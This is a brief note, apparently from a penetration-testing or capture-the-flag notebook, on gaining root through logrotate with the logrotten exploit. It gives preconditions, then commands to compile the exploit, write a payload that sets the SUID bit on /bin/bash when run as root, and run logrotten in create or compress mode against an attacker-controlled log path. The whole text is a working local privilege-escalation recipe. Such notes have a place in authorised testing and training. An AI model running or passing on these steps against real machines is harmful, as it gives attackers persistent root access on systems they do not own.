## Resources: https://github.com/whotwagner/logrotten Logrotten

### REQUIREMENTS:

#### 1) Logrotate has to be executed as root
#### 2) The logpath needs to be in control of the attacker
#### 3)Any option that creates files is set in the logrotate configuration

### STEPS:

#### 1) Download binary from the repo, then compile (gcc logrotten.c -o logrotten)

#### 2) echo "if [ `id -u` -eq 0 ]; then (chmod +xs /bin/bash); fi" > payload

#### 3) ./logrotten -p ./payload /tmp/log/pwnme.log (Create option)

#### 3) ./logrotten -p ./payload -c -s 4 /tmp/log/pwnme.log (Compress Option)
